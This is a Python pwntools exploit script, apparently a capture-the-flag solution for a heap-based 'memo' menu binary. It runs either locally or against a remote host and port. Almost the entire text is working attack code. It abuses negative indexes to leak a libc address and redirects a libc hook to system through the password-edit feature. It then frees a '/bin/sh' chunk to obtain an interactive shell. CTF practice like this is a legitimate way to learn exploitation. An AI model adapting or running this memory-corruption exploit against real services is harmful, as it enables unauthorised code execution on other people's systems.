#!/usr/bin/env python

from pwn import *
import sys

# House of Einherjar ?
# LOL we can edit any index ???

def memo(idx, l, msg, fake=False):
	r.sendline('1')
	r.sendlineafter(': ', str(idx))
	if fake:
		return r.recvuntil('>> ')
	r.sendlineafter(': ', str(l))
	r.sendafter(': ', msg)
	r.recvuntil('>> ')

def edit(msg):
	r.sendline('2')
	r.sendafter(': ', msg)
	r.recvuntil('!\n')
	leak = r.recvuntil('\n\n').strip()
	r.recvuntil('>> ')
	return leak

def edit_pswd(oldpwd, npwd, nuser):
	r.sendline('5')
	r.recvuntil(': ')
	r.send(oldpwd)
	r.sendafter(': ', nuser)
	r.sendlineafter(': ', npwd)
	r.recvuntil('>> ')

def exploit(r):
	r.recvuntil(': ')
	name = "uafio"
	r.send(name)
	r.recvuntil(' (y/n) ')
	r.sendline('y')
	r.recvuntil(': ')
	pswd = "uafio"
	r.send(pswd)
	r.recvuntil('>> ')

	memo(-350, 0, "A", True)
	leak = edit('A')
	libc_base = u64(leak.ljust(8, '\0')) -  0x6f5d0 # 0x6f690
	log.info("libc_base: " + hex(libc_base))

	# 0x3c57a8
	edit_pswd('uafio', p64(libc_base + 0x3c57a8) + p64(8), p64(libc_base + 0x3c57a8))

	memo(0, 8, '/bin/sh\x00')

	memo(-6, 8, 'A', True)
	# 0x45390
	edit(p64(libc_base + 0x45380))

	r.sendline('4')
	r.recvuntil(': ')
	r.sendline('0')

	r.interactive()



if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(['./memo'], env={"LD_PRELOAD":"./memo_libc.so.6"})
        print util.proc.pidof(r)
        pause()
        exploit(r)